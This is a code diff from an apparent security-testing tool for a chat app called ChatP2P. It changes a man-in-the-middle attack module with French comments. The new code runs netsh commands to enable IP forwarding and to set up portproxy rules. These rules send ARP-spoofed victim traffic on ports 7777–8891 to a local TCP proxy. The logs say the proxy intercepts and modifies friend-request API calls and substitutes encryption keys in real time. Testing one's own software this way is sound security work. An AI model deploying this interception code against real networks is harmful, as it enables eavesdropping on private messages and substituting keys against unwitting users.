@@ -104,39 +104,37 @@ namespace ChatP2P.SecurityTester.Attacks
         }
 
         /// <summary>
-        /// 🚀 Démarre proxy TCP transparent pour MITM réel
+        /// 🚀 Démarre proxy TCP transparent pour MITM réel avec Windows portproxy
         /// </summary>
         private async Task StartRealTCPProxy(string relayServerIP)
         {
             LogMessage?.Invoke("🚀 DÉMARRAGE PROXY TCP RÉEL:");
 
-            // Obtenir IP locale pour logs
-            var localIP = GetLocalIPAddress();
+            // 🔧 ÉTAPE 1: Configuration Windows port forwarding OBLIGATOIRE
+            LogMessage?.Invoke("🔧 Configuration Windows port forwarding...");
+            await ConfigureWindowsPortForwarding(relayServerIP);
 
-            // Démarrer proxy pour les ports ChatP2P
-            var ports = new[] { 7777, 8888, 8891 }; // friend, chat, files
-            var proxyTasks = new List<Task>();
+            // 🕷️ ÉTAPE 2: Démarrer proxy sur port 18889 (principal pour API + fallback pour autres)
+            LogMessage?.Invoke($"🕷️ Démarrage proxy MITM principal: localhost:18889 → {relayServerIP}:8889");
+            var proxyStarted = await _tcpProxy.StartProxy(18889, relayServerIP, 8889);
 
-            foreach (var port in ports)
+            if (proxyStarted)
             {
-                LogMessage?.Invoke($"🕷️ Démarrage proxy: {localIP}:{port} → {relayServerIP}:{port}");
-                var proxyStarted = await _tcpProxy.StartProxy(port, relayServerIP, port);
-
-                if (proxyStarted)
-                {
-                    LogMessage?.Invoke($"✅ Proxy actif sur port {port}");
-                }
-                else
-                {
-                    LogMessage?.Invoke($"❌ Échec proxy port {port}");
-                }
+                LogMessage?.Invoke($"✅ Proxy MITM principal actif sur port 18889");
+                LogMessage?.Invoke($"🎯 Architecture MITM HYBRIDE OPTIMISÉE:");
+                LogMessage?.Invoke($"   📡 7777 → portproxy DIRECT → relay:7777 [Friend Requests]");
+                LogMessage?.Invoke($"   📡 8888 → portproxy DIRECT → relay:8888 [Messages]");
+                LogMessage?.Invoke($"   🕷️ 8889 → portproxy → 18889 → TCPProxy → relay:8889 [API - INTERCEPTION ACTIVE]");
+                LogMessage?.Invoke($"   📡 8891 → portproxy DIRECT → relay:8891 [Files]");
+                LogMessage?.Invoke($"   🔧 Friend requests API calls seront interceptés et modifiés");
+                LogMessage?.Invoke($"   🚀 Performance optimisée: Seul l'API est intercepté pour friend requests");
+                LogMessage?.Invoke($"   🎯 MITM ciblé: Messages/files forwarded directement pour performance maximale");
             }
-
-            LogMessage?.Invoke("");
-            LogMessage?.Invoke("🎯 PROXY TCP OPÉRATIONNEL:");
-            LogMessage?.Invoke($"   📡 Tous les packets ChatP2P sont maintenant interceptés");
-            LogMessage?.Invoke($"   🔧 Friend requests seront modifiés automatiquement");
-            LogMessage?.Invoke($"   🕷️ Substitution clés en temps réel activée");
+            else
+            {
+                LogMessage?.Invoke($"❌ ÉCHEC proxy MITM port 18889");
+                LogMessage?.Invoke($"   ⚠️ Vérifiez que le port 18889 est libre");
+            }
         }
 
         /// <summary>
@@ -280,13 +278,13 @@ namespace ChatP2P.SecurityTester.Attacks
                 LogMessage?.Invoke($"🔧 Configuration Windows port forwarding...");
                 await ConfigureWindowsPortForwarding(relayServerIP);
 
-                // Démarrer proxy sur port 8889 (API ChatP2P)
-                var proxyStarted = await _tcpProxy.StartProxy(8889, relayServerIP, 8889);
+                // Démarrer proxy CENTRALISÉ intelligent qui gère TOUS les ports ChatP2P
+                var proxyStarted = await _tcpProxy.StartProxy(8890, relayServerIP, 8889);
 
                 if (proxyStarted)
                 {
-                    LogMessage?.Invoke($"✅ TCP Proxy actif: Port 8889 → {relayServerIP}:8889");
-                    LogMessage?.Invoke($"🎯 MITM RÉEL: Client → [PROXY] → Relay");
+                    LogMessage?.Invoke($"✅ TCP Proxy CENTRALISÉ actif: Port 8890 → {relayServerIP}");
+                    LogMessage?.Invoke($"🎯 MITM INTELLIGENT: Tous ports ChatP2P redirigés vers proxy unique !");
                     LogMessage?.Invoke($"   🔍 Interception friend requests en temps réel");
                     LogMessage?.Invoke($"   🔐 Substitution clés automatique");
                 }
@@ -317,12 +315,25 @@ namespace ChatP2P.SecurityTester.Attacks
                 var forwardingCmd = "netsh interface ipv4 set global sourceroutingbehavior=forward";
                 await ExecuteCommand(forwardingCmd, "Enable IP forwarding");
 
-                // Port proxy pour rediriger trafic ARP spoofé
-                var proxyCmd = $"netsh interface portproxy add v4tov4 listenport=8889 listenaddress={relayServerIP} connectport=8889 connectaddress=127.0.0.1";
-                await ExecuteCommand(proxyCmd, "Configure port proxy");
+                // Port proxy HYBRIDE - API intercepté, autres ports directs
+                var directPorts = new[] { 7777, 8888, 8891 }; // Friend requests, messages, files
+                var interceptPort = 8889; // API - INTERCEPTION OBLIGATOIRE pour friend requests
 
-                LogMessage?.Invoke($"✅ Port forwarding configuré: {relayServerIP}:8889 → localhost:8889");
-                LogMessage?.Invoke($"🎯 Trafic ARP spoofé sera automatiquement redirigé vers le proxy local");
+                // Forwarding DIRECT pour ports haute performance (pas d'interception)
+                foreach (var port in directPorts)
+                {
+                    var proxyCmd = $"netsh interface portproxy add v4tov4 listenport={port} listenaddress=0.0.0.0 connectport={port} connectaddress={relayServerIP}";
+                    await ExecuteCommand(proxyCmd, $"Configure direct forwarding {port}→{relayServerIP}:{port}");
+                    LogMessage?.Invoke($"✅ Port forwarding DIRECT: 0.0.0.0:{port} → {relayServerIP}:{port}");
+                }
+
+                // Forwarding MITM pour port API (interception friend requests)
+                var proxyCmd2 = $"netsh interface portproxy add v4tov4 listenport={interceptPort} listenaddress=0.0.0.0 connectport=18889 connectaddress=127.0.0.1";
+                await ExecuteCommand(proxyCmd2, $"Configure MITM interception {interceptPort}→localhost:18889");
+                LogMessage?.Invoke($"✅ Port forwarding MITM: 0.0.0.0:{interceptPort} → localhost:18889 [INTERCEPTION ACTIVE]");
+
+                LogMessage?.Invoke($"🎯 Trafic ARP spoofé sera automatiquement redirigé vers TCPProxy local");
+                LogMessage?.Invoke($"🕷️ Architecture COMPLÈTE: Victime → Windows Proxy → TCPProxy → Relay({relayServerIP})");
             }
             catch (Exception ex)
             {
